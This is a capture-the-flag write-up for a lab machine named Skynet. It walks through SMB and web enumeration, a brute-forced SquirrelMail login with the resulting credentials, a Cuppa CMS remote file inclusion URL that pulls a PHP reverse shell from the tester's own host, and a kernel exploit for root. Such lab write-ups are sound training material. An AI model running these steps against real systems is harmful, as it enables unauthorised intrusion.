@@ -1,0 +1,73 @@
+1: enumeration
+
+nmap with default scripts reveals http port 80 and smb, pop3 and smtp, 
+
+`nmap -sC machineip -v`
+
+`nmap —script=smb-enum-shares machineip -v`
+
+walking the page reveals nothing, gobuster reveals squirrelmail - simple login page 
+
+enumerating smb further with nmap scripts reveal the ability to log in anonymously, where we can find a note instructing ‘employees’ to change the passwords, together with 3 log files 
+
+`smbclient \\\\MACHINEIP\\Anonymous`
+
+`gobuster dir -w /usr/share/wordlists/dirb/common.txt -x txt,php,sh,py -u [http://](http://10.10.127.62/)MACHINEIP`
+
+2: breaking the login page
+
+i used one of the log files to bruteforce the login with burp using login milesdyson (miles wouldnt give me anything so i tried miles dyson, the char from terminator as this is skynet - system from terminator). bruteforcing this username with the log file (that straight up looked like passwords) i managed to get below creds:
+
+**milesdyson:cyborg007haloterminator**
+
+version of squirrelmail was prone to RCE, but i couldnt pull it off so decided to look through the messages where i found credentials for samba share that nmap script found, 
+
+`MACHINEIP\\milesdyson -U milesdyson`
+
+password to that was included in one of the messages
+
+inside the share, in the middle of many files there was a note called 
+
+**important.txt**
+
+that included /45kra24zxs28v3yd - a secret directory on the server, that displayed cuppa cms, a content management system vulnerable to:
+
+[https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971)
+
+this allowed me to grab a shell remotely including a file served on my desktop using python simple web server:
+
+[https://10.10.194.228/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.6.40:80/php-reverse-shell.php](https://10.10.194.228/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.6.40:80/php-reverse-shell.php) 
+
+`sudo python3 -m http.server --bind 10.9.6.40 80`
+
+used shell is ofcourse php script that comes with kali preinstalled,
+
+in /usr/share/webshells/php-reverse-shell.php
+
+3:privilege escalation 
+
+stabilised shell with
+
+`python -c 'import pty; pty.spawn("/bin/bash")’`
+
+i tried linenum.sh, enumerated manually, but what worked was 
+
+`uname -a`
+
+with output:
+
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+so after some research, this came up:
+
+[https://www.exploit-db.com/exploits/43418](https://www.exploit-db.com/exploits/43418) 
+
+this required to download the .c code, transfer it into the machine, 
+
+compile with:
+
+`gcc pwn.c -o pwn`
+
+`./pwn`
+
+which just made root shell pop out 🙂
